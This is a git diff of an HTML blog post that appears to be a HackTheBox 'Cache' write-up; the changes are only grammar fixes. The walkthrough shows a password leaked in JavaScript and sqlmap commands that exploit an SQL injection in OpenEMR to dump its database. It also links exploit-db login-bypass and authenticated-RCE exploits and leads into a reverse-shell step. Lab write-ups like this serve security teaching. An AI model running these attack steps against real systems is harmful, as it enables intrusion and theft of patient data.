@@ -127,7 +127,7 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 </code></pre></div><p>Nothing interesting at first place.</p>
 <p>Checking inside the port 80, there is a form login:</p>
 <p><img src="/images/posts/htb_cache_1.png" alt="alt text" title="HTB Cache login"></p>
-<p>Tried to bruteforce using usual password without luck.</p>
+<p>I tried to bruteforce using usual password without luck.</p>
 <p>So, I manually checked the sources inside the web:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">view</span><span style="color:#f92672">-</span><span style="color:#a6e22e">source</span><span style="color:#f92672">:</span><span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//10.10.10.188/jquery/functionality.js
 </span><span style="color:#75715e"></span>
@@ -167,20 +167,20 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
     });
     
 });
-</code></pre></div><p>So the password is <em>H@v3_fun</em>, but does not nothing using it, saved for later.</p>
-<p>Also i got another username on the sources:</p>
+</code></pre></div><p>So the password is <em>H@v3_fun</em>, but does nothing using it, saved for later.</p>
+<p>Also I got another username on the sources:</p>
 <p><img src="/images/posts/htb_cache_2.png" alt="alt text" title="HTB Cache John"></p>
 <p>John, because:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;logo1.png&#34;</span> <span style="color:#a6e22e">alt</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;John&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width:100%&#34;</span>&gt;
 </code></pre></div><p>Also there is enabled Apache directory list, leaking the OS and Apache version:</p>
 <p><img src="/images/posts/htb_cache_3.png" alt="alt text" title="HTB Cache directory listing enabled"></p>
-<p>I was stuck for a while, then I come back to the login page after the sucess i saw:</p>
+<p>I was stuck for a while, then I came back to the login page after the sucess I saw:</p>
 <p><img src="/images/posts/htb_cache_4.png" alt="alt text" title="HTB Cache HMS"></p>
 <p>HMS&hellip;Hospital Management System. It caugth my attention because is totally different from the hacker stuff that the blog has.</p>
-<p>Checking on Google, says that is a type of CMS or Software for medic/doctors administration.</p>
+<p>Checking on Google, says that is a kind of CMS or Software for medic/doctors administration.</p>
 <p>I tried to search references inside the host and finally I discovered that it has another hostname, so editing my /etc/hosts:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">10.10.10.188 cache.htb hms.htb
-</code></pre></div><p>Now i can view the openmr login page</p>
+</code></pre></div><p>Now I can view the openmr login page</p>
 <p><img src="/images/posts/htb_cache_5.png" alt="alt text" title="HTB Cache Login Page EMR"></p>
 <h2 id="2---vulnerability-identification">2 - Vulnerability Identification</h2>
 <p>I tried to bruteforce the login page without any luck and started a Dirbuster with a really huge results:</p>
@@ -188,8 +188,8 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 <h3 id="googling-again">Googling again</h3>
 <p>Checking on exploit-db, there is a Exploit to bypass the login:</p>
 <p><a href="https://www.exploit-db.com/exploits/47836">https://www.exploit-db.com/exploits/47836</a></p>
-<p>But did not work maybe because the version.</p>
-<p>So finally i discovered this video:</p>
+<p>But did not work, maybe because of the version.</p>
+<p>So finally I discovered this video:</p>
 <p><a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s">https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s</a></p>
 <p>The video says there is a SQLInjection on:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">add_edit_event_user.php
@@ -302,7 +302,7 @@ available databases <span style="color:#f92672">[</span>2<span style="color:#f92
 
 </code></pre></div><p>Great, can be exploited. The backend is MySQL and there are 2 databases openemr and information_schema</p>
 <h3 id="extracting-the-data">Extracting the data</h3>
-<p>Next step i to dump useful data:</p>
+<p>Next step is to dump useful data:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r request.txt --tables -D openemr
 </code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">+---------------------------------------+
 | array                                 |
@@ -357,11 +357,11 @@ Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display al
 Session completed
 </code></pre></div><p>hummm the password is:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">xxxxxx
-</code></pre></div><p>Using the password to log in i discovered the real version of EMR, i tried on the beginning to use exploits but did not work because the version and patching:</p>
+</code></pre></div><p>Using the password to log in I discovered the real version of EMR, I tried on the beginning to use exploits but did not work because of the version and patching:</p>
 <p><img src="/images/posts/htb_cache_8.png" alt="alt text" title="HTB Cache Dirbuster against EMR"></p>
 <p>But&hellip; there is another authenticated RCE exploit:</p>
 <p><a href="https://www.exploit-db.com/exploits/45161">https://www.exploit-db.com/exploits/45161</a></p>
-<p>All that I need is to use the working cracked password and username that I used to log in on EMR:</p>
+<p>All I need is to use the working cracked password and username that I used to log in on EMR:</p>
 <p><em>openemr_admin/xxxxxx</em></p>
 <h3 id="reverse-shell">Reverse shell</h3>
 <p>Upgrade the shell, because working on the webshell is hard:</p>
